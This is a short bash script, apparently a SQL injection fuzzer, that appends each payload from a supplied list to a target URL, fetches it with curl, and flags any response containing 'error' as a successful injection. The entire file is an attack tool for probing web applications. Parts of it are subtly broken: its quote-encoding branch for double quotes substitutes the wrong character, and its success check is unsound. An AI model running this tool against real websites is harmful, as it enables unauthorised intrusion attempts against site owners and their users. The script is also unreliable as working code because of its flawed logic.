#!/bin/bash
url="${1}"
list="${2}"
urlEncode() {
	while read -n 1 i
	do
		if [[ "${i}" = "'" ]]
		then
			char="${payload}"
			encode="%27"
			payload="${char/\'/$encode}"
		elif [[ "${i}" = '"' ]]
		then
			char="${payload}"
			encode="%22"
			payload="${char/\'/$encode}"
		fi
	done <<< "${payload}"
}

if [[ ! -z "${url}" && "${list}" ]]
then
	for payload in $(cat "${list}")
	do
		urlEncode "${payload}"
		curl -s "${url}""${payload}" |  isError="$(grep 'error')" && echo -e "\e[32mSuccessful Payload\e[0m: ${url}\e[31m${payload}\e[0m"
	done
else
	echo "./sqlfuzzer.sh url sqlPayloadList.txt"
fi
